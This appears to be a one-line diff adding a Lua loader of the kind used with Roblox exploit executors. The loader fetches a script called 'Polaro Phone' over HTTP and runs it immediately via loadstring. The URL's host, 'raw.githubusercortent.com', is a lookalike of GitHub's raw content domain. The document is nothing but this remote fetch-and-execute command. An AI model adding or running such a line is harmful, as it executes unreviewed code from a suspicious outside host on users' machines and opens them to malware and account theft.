@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/TheTrollMane/ok/master/Polaro%20Phone"))()
